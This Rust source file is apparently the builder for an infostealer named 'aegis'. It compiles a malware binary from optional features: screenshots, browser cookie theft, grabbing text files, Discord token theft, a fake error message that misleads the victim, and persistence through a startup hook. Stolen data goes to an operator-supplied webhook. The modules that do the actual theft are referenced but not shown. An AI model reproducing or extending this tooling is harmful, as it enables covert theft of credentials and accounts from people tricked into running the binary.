use std::process::Command;
mod utils;

pub fn build_binary(
    ds: bool,
    gc: bool,
    gt: bool,
    gdt: bool,
    fake_error: bool,
    hook_to_startup: bool,
    fe_title: &str,
    fe_msg: &str,
    webhook_uri: String,
) {
    let mut features = Vec::new();
    if ds {
        features.push("aegis/desktop_screenshot");
    }
    if gc {
        features.push("aegis/grab_cookies");
    }
    if gt {
        features.push("aegis/grab_txts");
    }
    if gdt {
        features.push("aegis/grab_discord_token");
    }
    if fake_error {
        features.push("aegis/fake_error");
    }
    if hook_to_startup {
        features.push("aegis/hook_to_startup");
    }

    let mut cmd = Command::new("cargo");

    cmd.arg("build")
        .arg("--release")
        .arg("-p")
        .arg("aegis_binary")
        .arg("--features")
        .arg(features.join(" "));

    cmd.env("WEBHOOK_URI", webhook_uri);
    if fake_error {
        cmd.env("FE_TITLE", fe_title);
        cmd.env("FE_MSG", fe_msg);
    }

    let status = cmd.status().unwrap();

    if status.success() {
        println!("Executable built successfully!");
    } else {
        println!("Failed to build executable.");
    }
}

pub async fn send() {
    utils::send::send_hook().await;
}

pub async fn show_error(title: &str, msg: &str) {
    utils::fake_error::show_error(title, msg).await;
}

pub async fn hook_to_startup() -> std::io::Result<()> {
    utils::startup::startup()
}
